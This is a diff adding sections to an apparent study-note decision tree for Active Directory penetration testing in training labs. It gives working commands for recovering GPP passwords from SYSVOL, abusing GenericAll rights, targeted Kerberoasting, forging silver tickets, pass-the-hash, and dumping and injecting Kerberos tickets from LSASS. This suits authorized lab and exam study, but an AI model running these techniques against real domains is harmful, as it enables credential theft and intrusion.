@@ -186,6 +186,66 @@ Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.
 
 ---
 
+## I found writable/readable shares — what am I looking for?
+
+```
+Always check SYSVOL first (readable by all domain users):
+  ls \\<DC>\sysvol\<domain>\Policies\
+  findstr /S /I "cpassword" \\<DC>\sysvol\<domain>\       (cmd)
+  → If cpassword found:
+      cat the XML file → note <userName> (service account) + <cpassword> (encrypted)
+      On Kali: gpp-decrypt "<cpassword_string>"  → plaintext password
+      → Spray that password against domain users / use directly if account name is known
+
+  Why cpassword is always recoverable: MS published the AES-256 key on MSDN
+  (KB2962486 patched GPP but old XML files often linger in SYSVOL for years)
+
+Custom shares (docshare, Users, backup, Tools):
+  → Config files, scripts, .xml files (search for "password", "pass", "cred", "key")
+  → .txt files with email threads / "auto-generated" passwords
+  → Git repos (.git/config, .env files)
+  findstr /S /I "password" \\<host>\<share>\               (cmd — broad sweep)
+
+Folders named "do-not-share" / "private" / "confidential":
+  → Almost always misconfigured — open them first
+```
+
+Full reference: [[Active Directory Introduction and Enumeration#22.3.5 Enumerating Domain Shares|Module 22 §22.3.5]], [[Active Directory#Domain Shares & SYSVOL|Command Appendix]]
+
+---
+
+## I found GenericAll on a user or group — what do I do?
+
+```
+GenericAll on a GROUP (e.g. Management Department):
+  → Add yourself or another controlled user:
+    net group "Management Department" <your_user> /add /domain
+  → Verify: Get-NetGroup "Management Department" | select member
+  → Clean up after: net group "Management Department" <your_user> /del /domain
+
+GenericAll on a USER (e.g. robert):
+  → Reset their password (no current password needed — GenericAll includes ForceChangePassword):
+    net user robert Password123! /domain
+  → Test admin access with new creds:
+    $pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
+    $cred = New-Object System.Management.Automation.PSCredential ("corp\robert", $pass)
+    Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock {whoami}
+  → If admin on a machine: get flag via UNC admin shares (not direct path — UAC token filtering):
+    type "\\<target>\c$\Users\administrator\Desktop\proof.txt"
+
+  Alternatively (more powerful — set SPN for targeted Kerberoasting):
+    Set-DomainObject -Credential $Cred -Identity <user> -SET @{serviceprincipalname='x/y'}
+    → Rubeus kerberoast /user:<user> /nowrap → hashcat -m 13100
+    → Cleanup: Set-DomainObject -Credential $Cred -Identity <user> -Clear serviceprincipalname
+
+Note: PSCredential chain needed only when you are NOT already running as the account that holds the ACE.
+If you ARE that account (e.g. you're running as stephanie who has GenericAll), net group/net user work directly.
+```
+
+Full reference: [[Active Directory Introduction and Enumeration#22.3.4 Enumerating Object Permissions|Module 22 §22.3.4]], [[Active Directory (Decision Tree)#I have an ACE on a target object — what attack applies?|Decision Tree: ACE attacks]]
+
+---
+
 ## I need to collect BloodHound data but can't run SharpHound on the target
 
 ```
@@ -199,4 +259,136 @@ SharpHound.exe is still faster and collects more session data when AV allows it.
 
 ---
 
-#### Tags: #DecisionTree #ActiveDirectory #ADEnum #PasswordSpray #ACLAbuse #DCSync #DomainTrust #ExtraSids #NoPac #CrossForest #BloodHound #HTBSupplementary
+---
+
+## I have a service account's NTLM hash — what can I do?
+
+```
+Option 1: Silver Ticket (no DC interaction after forge — stealthy)
+  Need: NTLM hash + Domain SID + target SPN
+  → Get Domain SID: whoami /user → strip the RID from the end
+  → Forge: mimikatz kerberos::golden /ptt /sid:<sid> /domain:corp.com
+            /target:<server.fqdn> /service:<class> /rc4:<hash> /user:jeffadmin
+  → Inject is automatic with /ptt → klist to verify → use the service
+  
+  Service classes: http (IIS), cifs (file shares), host (WinRM/WMI), ldap, mssql
+  
+  Limit: access only to that one service on that one server. Not a full DA path.
+
+Option 2: Pass-the-Hash (if it's a local/domain admin account)
+  → impacket-psexec -hashes :<ntlm> domain/user@<target>
+  → crackmapexec smb <subnet> -u user -H <ntlm>
+
+Option 3: Crack it offline (if weak password suspected)
+  → hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
+```
+
+---
+
+## impacket Kerberos tool gives KRB_AP_ERR_SKEW — what do I do?
+
+```
+Kerberos requires client and KDC within 5 minutes. OffSec lab VMs run real time;
+Kali can be hours behind if the VM was dormant.
+
+Fix (careful ordering — large offsets kill the VPN):
+  1. sudo timedatectl set-ntp false       ← disable NTP daemon first
+  2. sudo ntpdate <DC_IP>                 ← jump to DC time (WILL kill VPN if offset >1 min)
+  3. Reconnect VPN immediately (TLS session fails on clock jump)
+  4. Run impacket command — should work now
+  5. sudo timedatectl set-ntp true        ← restore NTP after lab
+
+Alternative (keep VPN alive):
+  sudo apt install libfaketime
+  faketime "$(date -d "$(ntpdate -q <DC_IP> | tail -1 | awk '{print $1,$2}')" +%s)" impacket-GetUserSPNs ...
+  (wraps just the impacket process — system clock unchanged — VPN survives)
+
+⚠️ Repeated failed auth from clock-skew errors can lock accounts (Kerberos pre-auth failures count).
+   Fix the clock BEFORE spraying or Kerberoasting.
+```
+
+---
+
+## Rubeus fails over evil-winrm — what do I do?
+
+```
+evil-winrm authenticates via NTLM → no Kerberos TGT exists in the session.
+Rubeus needs a TGT to request service tickets.
+
+Symptom: "No credentials are available in the security package" or "An operations error occurred"
+
+Options:
+  1. Use impacket from Kali instead (always works — impacket is Kerberos-native):
+     impacket-GetUserSPNs -request -dc-ip <DC_IP> domain/user:pass
+     impacket-GetNPUsers -dc-ip <DC_IP> -request domain/user:pass
+
+  2. RDP to the target instead (RDP session gets a real TGT) → then Rubeus works fine
+
+  3. Rubeus /spn:<specific_SPN> flag bypasses user LDAP lookup — but still needs a TGT → fails same way
+```
+
+---
+
+---
+
+## whoami /groups shows BUILTIN\Administrators as "Group used for deny only" — what does that mean?
+
+```
+UAC is filtering the token. The user IS a local admin (their SID is in the Administrators group)
+but the interactive RDP/logon session stripped elevated privileges at login.
+You have a medium integrity token, not high.
+
+Two paths forward:
+  1. Elevate on THIS machine:
+     Start-Process powershell.exe -Verb RunAs
+     → UAC consent dialog pops in the RDP session → click Yes
+     → New elevated PS window (high integrity) → now Mimikatz, registry writes etc work
+
+  2. Look ELSEWHERE — their local admin may carry to other machines:
+     crackmapexec smb <subnet> -u <user> -p '<pass>' -d <domain> --continue-on-success
+     → Look for (Pwn3d!) — that's a machine where they have unfiltered admin access
+     → Connect there via impacket-wmiexec / impacket-psexec with plaintext creds
+     
+Key signal: Medium Mandatory Level in whoami /groups = filtered token (UAC active).
+High Mandatory Level = elevated. SYSTEM Mandatory Level = SYSTEM.
+
+⚠️ Don't use PsExec or net use \\target\ADMIN$ from the filtered session — they'll fail.
+```
+
+Full reference: [[Lateral Movement in Active Directory#Capstone Lessons|Module 24 Capstone Lessons]]
+
+---
+
+## I have local admin on a machine and other users are logged in — what can I steal?
+
+```
+Other users' Kerberos tickets live in LSASS regardless of whose session they came from.
+With local admin (elevated) you can dump ALL sessions at once.
+
+From elevated Mimikatz:
+  privilege::debug
+  sekurlsa::tickets /export
+  → Writes all TGT and TGS from all sessions to .kirbi files in current dir
+
+Read the filenames — they tell you everything:
+  [0;xxxx]-0-0-40810000-dave@cifs-web04.kirbi → Group 0 = TGS for cifs/web04 as dave
+  [0;xxxx]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi → Group 2 = TGT for dave
+
+Inject a TGS (if you just need that one service):
+  kerberos::ptt [0;xxxx]-0-0-40810000-dave@cifs-web04.kirbi
+  ls \\web04\backup   ← now works with dave's access
+
+Inject a TGT (if you want to request new TGSes for any service):
+  kerberos::ptt [0;xxxx]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
+  klist   ← verify
+  PsExec.exe \\web04 cmd   ← use HOSTNAME not IP (Kerberos)
+
+Group 0 = TGS (service-specific), Group 2 = TGT (domain-wide). The number after
+the second dash in the filename: 0-0 = TGS, 2-0 = TGT.
+```
+
+Full reference: [[Lateral Movement in Active Directory#24.1.5 Pass the Ticket (PtT)|Module 24 §24.1.5]]
+
+---
+
+#### Tags: #DecisionTree #ActiveDirectory #ADEnum #PasswordSpray #ACLAbuse #DCSync #SilverTicket #Kerberoasting #KerberosClockSkew #DomainTrust #ExtraSids #NoPac #CrossForest #BloodHound #HTBSupplementary #Module22 #Module23 #SYSVOL #GPP #GenericAll #DomainShares #LateralMovement #PassTheTicket #UACFiltering #Module24
